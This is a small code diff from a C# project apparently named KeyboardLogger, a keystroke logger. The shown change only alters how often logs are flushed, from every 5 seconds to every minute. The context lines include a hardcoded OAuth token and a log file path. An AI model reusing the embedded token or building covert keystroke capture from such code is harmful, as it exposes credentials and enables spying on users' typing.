@@ -16,7 +16,7 @@ namespace KeyboardLogger.KeyLog
         const string auth = "OAuth hJdydVEvOe4ymWhUqzuzAeakl0g";
         // local constants
         const string path = @"C:\Program_Files\cs-keyboard-logger\";
-        static TimeSpan flushSpan = new TimeSpan(0, 0, 5);
+        static TimeSpan flushSpan = new TimeSpan(0, 1, 0);
         const string ext = ".log";
 
         // data
